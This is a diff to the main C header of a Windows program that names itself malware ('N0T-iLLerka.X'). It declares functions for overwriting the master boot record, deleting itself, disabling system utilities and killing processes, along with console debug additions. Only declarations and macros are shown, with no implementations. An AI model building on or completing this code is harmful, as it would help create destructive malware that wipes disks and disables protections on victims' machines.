@@ -1,6 +1,11 @@
 //// N0T-iLLerka.h : N0T-iLLerka.X's main Header File ///////////////////////////////////////////////////////////////////////////////////////////////
 #pragma once
 
+// Temp C&P -ing
+#if defined(_CONSOLE)
+
+#endif // _CONSOLE
+
 //// Compiler/Linker ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #pragma comment(linker,"\"/manifestdependency:type='win32' \
 name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
@@ -17,11 +22,14 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 //// Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+// General Macros //
+#define szMALWR_NAME L"N0T-iLLerka.X [.niX]"
+
 // ErrorHandler Macros //
 #if DEBUG_MSG == TRUE
-#define szFORMAT L"%s returned with Errorcode:\n%d : %s"
-#define nFORMAT_LEN lstrlen(szFORMAT)
-#define cbMAX_HEAP_SIZE 0xfa0
+	#define szFORMAT L"%s returned with Errorcode:\n%d : %s"
+	#define nFORMAT_LEN lstrlen(szFORMAT)
+	#define cbMAX_HEAP_SIZE 0xfa0
 #endif // DEBUG_MSG
 
 // FileSystem Macros //
@@ -39,8 +47,6 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define nSEMAPHORE 2
 
 // Utilitie Macros //
-#define szMALWR_NAME L"N0T-iLLerka.X [.niX]"
-
 #define nMIN_RS_LEN 0x8
 #define nMAX_RS_LEN 0x10
 #define nMAX_BUFFER_SIZE 0x2000000
@@ -48,29 +54,48 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 //// Wrapper Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
 #if DEBUG_MSG == TRUE
-#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...) fnErrorHandlerW(lpText, lpCaption, lpFunction, uType, __VA_ARGS__)
-#else // DEBUG_MSG
-#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
-#endif // !DEBUG_MSG
+	#if defined(_WINDOWS)
+		#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...) fnErrorHandlerW(lpText, lpCaption, lpFunction, uType, __VA_ARGS__)
+	#elif defined(_CONSOLE)
+		#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
+	#endif // _WINDOWS || _CONSOLE
+#else
+	#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
+#endif // DEBUG_MSG
 
 //// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 extern const WCHAR szCharSet[];
-extern const size_t cnCharSet;
+extern const SIZE_T clCharSet;
+
+extern LPCWSTR szKillProcs[];
+extern const SIZE_T clKillProcs;
 
 extern WCHAR szCd[MAX_PATH];
 extern WCHAR szMfn[MAX_PATH];
 
+#if defined(_CONSOLE)
+extern const WCHAR szN0TiLLerkaX[];
+#endif // _CONSOLE
+
 //// Function Declarations //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// DebugConsole Functions //
+#if defined(_CONSOLE)
+BOOL fnPrintConsoleNiXW(VOID);
+DWORD WINAPI thPrintConsoleTitleW(
+	_In_ LPVOID lpParam
+);
+#endif // _CONSOLE
 
 // ErrorHandling Function //
 #if DEBUG_MSG == TRUE
-VOID fnErrorHandlerW(
-	_In_opt_ LPCWSTR lpText,
-	_In_opt_ LPCWSTR lpCaption,
-	_In_     LPCWSTR lpFunction,
-	_In_opt_ UINT    uType,
-	_In_opt_         ...
-);
+	VOID fnErrorHandlerW(
+		_In_opt_ LPCWSTR lpText,
+		_In_opt_ LPCWSTR lpCaption,
+		_In_     LPCWSTR lpFunction,
+		_In_opt_ UINT    uType,
+		_In_opt_         ...
+	);
 #endif // DEBUG_MSG
 
 // FileSystem Functions //
@@ -89,7 +114,7 @@ BOOL fnDirectoryIteratorW(
 );
 BOOL fnSelfDeleteW(VOID);
 #if KILL_MBR == TRUE
-BOOL fnOverwriteMBR(VOID);
+	BOOL fnOverwriteMBR(VOID);
 #endif // KILL_MBR
 
 // GenRandom Functions //
@@ -113,7 +138,7 @@ BOOL fnCheckRegistryKeyW(
 	_In_ LPCWSTR lpSubKey
 );
 #if DISABLE_PROTECTIONS == FALSE
-BOOL fnDisableUtilities(VOID);
+	BOOL fnDisableUtilities(VOID);
 #endif // !DISABLE_PROTECTIONS
 
 // Resource Functions //
@@ -129,12 +154,12 @@ BOOL fnSaveResourceW(
 
 // Synchronization Functions //
 #if DISABLE_SYNCHRONIZATION == FLASE
-BOOL fnCheckMutexW(
-	_In_ LPCWSTR lpName
-);
-HANDLE fnCheckSemaphoreW(
-	_In_ LPCWSTR lpName
-);
+	BOOL fnCheckMutexW(
+		_In_ LPCWSTR lpName
+	);
+	HANDLE fnCheckSemaphoreW(
+		_In_ LPCWSTR lpName
+	);
 #endif // !DISABLE_SYNCHRONIZATION
 
 // Utilitie Functions //
